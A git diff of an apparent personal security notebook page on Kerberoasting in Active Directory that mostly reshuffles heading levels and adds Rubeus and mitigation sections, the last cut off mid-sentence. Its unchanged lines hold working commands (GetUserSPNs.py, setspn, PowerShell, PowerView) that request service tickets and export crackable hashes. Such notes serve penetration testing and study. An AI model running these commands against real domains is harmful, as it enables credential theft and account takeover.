@@ -2,7 +2,7 @@
 title: ## Table of Contents
 style: nestedList # TOC style (nestedList|nestedOrderedList|inlineFirstLevel)
 minLevel: 0 # Include headings from the specified level
-maxLevel: 3 # Include headings up to the specified level
+maxLevel: 2 # Include headings up to the specified level
 includeLinks: true # Make headings clickable
 debugInConsole: false # Print debug info in Obsidian console
 ```
@@ -25,9 +25,9 @@ The attack can be performed from multiple places:
 - As `SYSTEM` on a domain-joined Windows host
 - From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) `/netonly`
 
-### Kerberoasting with GetUserSPNs.py - Linux
+## Kerberoasting with GetUserSPNs.py - Linux
 `GetUserSPNs.py` is an [impacket toolkit](https://github.com/SecureAuthCorp/impacket) script for working with SPNs.
-#### Request TGS tickets for SPN accounts
+### Request TGS tickets for SPN accounts
 ```bash
 # Requests from all accounts
 GetUserSPNs.py -dc-ip [ip] [domain]/[user] -request -outputfile all_accounts_tgs
@@ -38,10 +38,10 @@ GetUserSPNs.py -dc-ip [ip] [domain]/[user] -request-user [target-user]
 > The output will be in format for [[Hashcat]] - mode: 13100
 > We can then use a tool like [[CrackMapExec]] to validate the account credentials once cracked.
 
-### Manual Kerberoasting with setspn.exe - Windows
+## Manual Kerberoasting with setspn.exe - Windows
 Before modern automated tools existed, manual methods such as using the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) was the way this attack was performed.
 The general methodology is to extract a bunch of SPNs, then request TGS tickets and have them loaded into memory. Finally, we can then use a tool like [[Mimikatz]] to extract them from memory.
-#### Enumerate SPNs
+### Enumerate SPNs
 ```batch
 setspn.exe -Q */*
 
@@ -51,7 +51,7 @@ CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
 ```
 > This will return not only users, but computers too. You may want to only focus on users.
 
-#### Targeting a single user
+### Targeting a single user
 ```PowerShell
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
@@ -64,29 +64,38 @@ The general concept here is:
 5. Using the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class creates a security token for the passed SPN name for our currently logged in user
 > This is essentially what automated tools such as [[Rubeus]] do
 
-#### Targeting all users
+### Targeting all users
 > This will include computers, not just users
 
 ```PowerShell
 setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
 ```
 
-#### Extracting the tickets from memory using [[Mimikatz]]
+### Extracting the tickets from memory using [[Mimikatz]]
 ![[Mimikatz#Extracting Kerberos TGS Tickets]]
 
-### Automated Kerberoasting with PowerView - Windows
-#### View users with SPNs
+## Automated Kerberoasting with PowerView - Windows
+### View users with SPNs
 ```PowerShell
 Import-Module .\PowerView.ps1
 Get-DomainUser * -spn | select samaccountname
 ```
-#### Target a specific user
+### Target a specific user
 ```PowerShell
 Get-DomainUser -Identity [user] | Get-DomainSPNTicket -Format Hashcat
 ```
-#### Extracting all tickets to a csv
+### Extracting all tickets to a csv
 ```PowerShell
 Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv [outputfile].csv -NoTypeInformation
 cat [outputfile].csv
 ```
 
+## Automated Kerberoasting with [[Rubeus]] - Windows
+![[Rubeus#Summary]]
+![[Rubeus#Usage]]
+
+## Mitigation & Detection
+### Non-managed service accounts
+Using long and complex passwords or pass phrases can drastically reduce the risk of passwords being cracked. A better recommendation is to use [Managed Service Accounts (MSA)](https://techcommunity.microsoft.com/t5/ask-the-directory-services-team/managed-service-accounts-understanding-implementing-best/ba-p/397009), and [Group Managed Service Accounts (gMSA)](https://docs.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview), which use very complex passwords, and automatically rotate on a set interval (like machine accounts) or accounts set up with [[Windows#Local Administrator Password Solution (LAPS)|LAPS]].
+
+When Kerberoasting is being performed, an abnormal number of `TGS-REQ` and `TGS-REP` requests and responses will be made. This could be an 
